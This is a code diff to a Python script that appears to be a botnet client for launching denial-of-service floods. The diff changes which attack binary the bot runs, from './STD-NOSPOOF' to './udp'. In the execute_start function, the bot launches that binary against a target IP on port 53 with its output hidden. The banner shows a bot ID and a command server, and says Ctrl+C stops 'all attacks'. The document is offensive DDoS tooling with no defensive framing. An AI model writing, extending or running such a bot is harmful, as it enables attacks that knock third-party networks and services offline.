@@ -27,14 +27,14 @@ def get_or_create_bot_id():
     return bot_id
 
 def execute_start(ip):
-    if not os.path.exists("./STD-NOSPOOF"):
-        print(f"[!] ERROR: ./STD-NOSPOOF not found!")
+    if not os.path.exists("./udp"):
+        print(f"[!] ERROR: ./udp not found!")
         return False
 
     print(f"[+] Command START {ip}:80. Running tool...")
     try:
         proc = subprocess.Popen(
-            ["./STD-NOSPOOF", ip, "53"],
+            ["./udp", ip, "53"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
@@ -101,7 +101,7 @@ def main():
     print(f"=====================================")
     print(f"  Bot ID: {BOT_ID}")
     print(f"  Server: {API_URL}")
-    print(f"  Tool:   ./STD-NOSPOOF")
+    print(f"  Tool:   ./udp")
     print(f"=====================================")
     print("Bot is running in background and listening to API.")
     print("Press Ctrl+C to exit and stop all attacks.")
